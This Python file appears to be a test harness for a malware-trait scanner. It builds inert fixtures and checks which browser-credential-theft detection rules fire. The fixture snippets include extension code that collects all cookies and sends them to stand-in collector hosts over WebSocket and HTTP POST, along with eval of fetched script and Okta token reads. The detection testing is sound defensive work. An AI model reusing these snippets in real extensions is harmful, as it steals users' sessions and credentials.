#!/usr/bin/env python3
"""Static controls for browser-auth triage; never execute fixture source."""
import argparse
import json
from pathlib import Path
import struct
import subprocess
import tempfile
import zipfile

DEPLOY = 'micro-behaviors/process/deploy::browser-headers-near-response-eval'
COPY = 'micro-behaviors/os/clipboard/write::browser-token-variable-write'
STORE = 'micro-behaviors/data/db/web-storage::okta-token-store-key'
JSON_B64 = 'micro-behaviors/data/decode/base64::json-call-atob-proximity'
COOKIE_B64 = 'micro-behaviors/data/decode/base64::page-cookie-atob-proximity'
ENTRY = 'metadata/binary/section/header::pe-entry-in-data-like-section'
RETIRED = {
    'objectives/exfiltration/http/report::all-site-extension-cookie-forward',
    'objectives/evasion/masquerade/traffic::masqueraded-fetch-eval-dropper',
    'objectives/credential-access/browser/extension::broad-extension-cookie-api-remote-post',
    'objectives/credential-access/browser/extension::broad-extension-page-cookie-auth-reuse',
    'objectives/exfiltration/stealer/browser::broad-extension-auth-storage-bearer-reuse',
    'objectives/evasion/masquerade/binary/signature::signature-overlay-strings',
}
HEADERS = '''const headers = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64)",
Accept:"text/html,application/xhtml+xml"};
const response = await fetch("https://example.org/plugin.js", {headers});
'''


def pe(entry_section):
    """Inert one-section PE: positive/negative section-name controls."""
    data = bytearray(1024)
    data[:2] = b'MZ'
    struct.pack_into('<I', data, 0x3c, 0x80)
    data[0x80:0x84] = b'PE\0\0'
    struct.pack_into('<HHIIIHH', data, 0x84, 0x14c, 1, 0, 0, 0, 224, 0x2102)
    opt = 0x98
    struct.pack_into('<H', data, opt, 0x10b)
    struct.pack_into('<I', data, opt + 16, 0x1000)
    struct.pack_into('<III', data, opt + 28, 0x400000, 0x1000, 0x200)
    struct.pack_into('<II', data, opt + 56, 0x2000, 0x200)
    struct.pack_into('<H', data, opt + 68, 2)
    struct.pack_into('<I', data, opt + 92, 16)
    section = opt + 224
    data[section:section + 8] = entry_section.encode().ljust(8, b'\0')
    struct.pack_into('<IIII', data, section + 8, 0x200, 0x1000, 0x200, 0x200)
    struct.pack_into('<I', data, section + 36, 0xc0000040 if entry_section == '.data' else 0x60000020)
    return bytes(data)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--cleave', default='cleave')
    parser.add_argument('--scratch', required=True, type=Path)
    parser.add_argument('--case', help='Run one named control')
    args = parser.parse_args()
    repo = Path(__file__).resolve().parents[3]
    cases = [
        ('response.js', HEADERS + 'eval(response.responseText);', {DEPLOY}, set()),
        ('unrelated.js', HEADERS + 'eval(document.querySelector("html").outerHTML);', set(), {DEPLOY}),
        ('no-headers.js', 'eval(response.responseText);', set(), {DEPLOY}),
        ('copy.js', 'navigator.clipboard.writeText(accessToken);', {COPY}, set()),
        ('label.js', 'const token = "status"; navigator.clipboard.writeText(title);', set(), {COPY}),
        ('store.js', 'localStorage.getItem("okta-token-storage");', {STORE}, set()),
        ('store-comment.js', '// okta-token-storage\nlocalStorage.getItem("settings");', set(), {STORE}),
        ('decode.js', 'const obj = await response.json(); atob(blob); atob(document.cookie);', {JSON_B64, COOKIE_B64}, set()),
        ('no-decode.js', 'const obj = await response.json(); const cookie = document.cookie;', set(), {JSON_B64, COOKIE_B64}),
        ('entry-data.dll', pe('.data'), {ENTRY}, set()),
        ('entry-text.dll', pe('.text'), set(), {ENTRY}),
    ]
    with tempfile.TemporaryDirectory(prefix='browser-auth-', dir=args.scratch) as tmp:
        tmp = Path(tmp)
        # Preserve a concrete theft detection: a privileged cookie read coupled
        # to a cookie-bearing WebSocket send, rather than unrelated HTTP code.
        archive = tmp / 'cookie-transfer.xpi'
        manifest = {'manifest_version': 3, 'name': 'Cookie transfer control', 'version': '1.0',
                    'permissions': ['cookies'], 'host_permissions': ['<all_urls>']}
        code = '''const ws = new WebSocket("wss://session-control.invalid/socket");
chrome.cookies.getAll({}, cookies => ws.send(JSON.stringify({cookies})));
'''
        with zipfile.ZipFile(archive, 'w') as z:
            z.writestr('manifest.json', json.dumps(manifest))
            z.writestr('background.js', code)
        cases.append((archive.name, None,
                      {'objectives/credential-access/browser/extension::extension-websocket-cookie-jar-exfiltration'}, set()))
        http_archive = tmp / 'cookie-http-transfer.xpi'
        http_code = """chrome.cookies.getAll({}, cookies => {
fetch('https://collector.fixture-control.org/upload', {method:'POST',
headers:{'Content-Type':'application/json'}, body:JSON.stringify({cookies: cookies})});
});"""
        with zipfile.ZipFile(http_archive, 'w') as z:
            z.writestr('manifest.json', json.dumps(manifest))
            z.writestr('background.js', http_code)
        cases.append((http_archive.name, None,
                      {'objectives/credential-access/browser/extension::extension-cookie-store-remote-post'}, set()))
        helper = tmp / 'ticket-helper.xpi'
        manifest['content_scripts'] = [{'matches': ['<all_urls>'], 'js': ['page.js']}]
        helper_code = HEADERS + """
eval(document.querySelector('html').outerHTML);
chrome.cookies.getAll({url: tab.url}, cookies => chrome.runtime.sendMessage({cookie:cookies}));
const decoded = atob(document.cookie.split('session=')[1]);
const token = localStorage.getItem('okta-token-storage');
fetch('https://example.org/account', {credentials:'include', method:'POST',
    headers:{authorization:`Bearer ${token}`}, body:JSON.stringify({ticket: ticketId})});
"""
        with zipfile.ZipFile(helper, 'w') as z:
            z.writestr('manifest.json', json.dumps(manifest))
            z.writestr('page.js', helper_code)
        cases.append((helper.name, None, {STORE, COOKIE_B64}, {DEPLOY}))
        if args.case:
            cases = [case for case in cases if case[0] == args.case]
            assert cases, args.case
        for name, content, required, absent in cases:
            path = tmp / name
            if isinstance(content, bytes):
                path.write_bytes(content)
            elif content is not None:
                path.write_text(content)
            result = subprocess.run([args.cleave, '--traits-dir', str(repo), '--format', 'json', str(path)],
                                    capture_output=True, text=True, check=True)
            report = json.loads(result.stdout)
            traits = {t['id']: t for f in report['files'] for t in f.get('traits', [])}
            missing = required - traits.keys()
            unexpected = (absent | RETIRED) & traits.keys()
            assert not missing and not unexpected, (name, missing, unexpected)
            if name == 'ticket-helper.xpi':
                assert not [t['id'] for t in traits.values() if t['crit'] >= 4], (name, [t['id'] for t in traits.values() if t['crit'] >= 4])
            for trait in required & {DEPLOY, COPY, STORE, JSON_B64, COOKIE_B64, ENTRY}:
                assert traits[trait]['crit'] == 3, (name, trait, traits[trait]['crit'])
            print('PASS', name, flush=True)
    print(f'{len(cases)} static controls passed')


if __name__ == '__main__':
    main()
